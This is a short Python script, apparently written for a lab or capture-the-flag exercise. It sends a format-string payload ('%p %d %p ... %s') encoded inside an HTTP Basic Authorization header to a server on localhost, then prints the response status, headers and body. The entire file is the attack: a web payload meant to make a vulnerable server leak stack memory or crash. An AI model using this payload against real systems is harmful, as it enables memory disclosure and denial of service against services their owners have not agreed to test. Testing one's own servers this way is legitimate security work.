import requests
import base64




payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
response = requests.get("http://localhost:8000",headers = headers)





print(response.status_code)
print(response.headers)
print(response.text)